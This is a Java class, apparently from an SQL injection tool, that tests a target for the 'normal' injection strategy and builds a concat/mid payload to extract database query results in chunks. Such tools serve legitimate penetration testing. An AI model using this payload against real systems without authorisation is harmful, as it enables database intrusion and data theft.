package com.jsql.model.pattern.strategy;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.AbstractSuspendable;
import com.jsql.model.StoppableGetInitialQuery;
import com.jsql.model.bean.Request;
import com.jsql.view.MediatorGUI;

/**
 * Injection strategy using normal attack.
 */
public class StrategyNormal extends AbstractStrategyInjection {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(StrategyNormal.class);

    @Override
    public void checkApplicability() throws PreparationException {
        LOGGER.info("Normal test...");
        MediatorGUI.model().initialQuery = new StoppableGetInitialQuery().beginSynchrone();

        this.isApplicable = !"".equals(MediatorGUI.model().initialQuery);
        
        if (this.isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }

    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkNormalVulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkNormalInvulnerable");
        MediatorGUI.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
        return MediatorGUI.model().inject(
                "select+" +
                    "concat(" +
                        "0x53514c69," +
                        "mid(" +
                            "(" + sqlQuery + ")," +
                            startPosition + "," +
                            "65536" +
                        ")" +
                    ")",
                null,
                true
        );
    }

    @Override
    public void applyStrategy() {
        LOGGER.info("Using normal injection...");
        MediatorGUI.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MarkNormalStrategy");
        MediatorGUI.model().interact(request);
    }
}
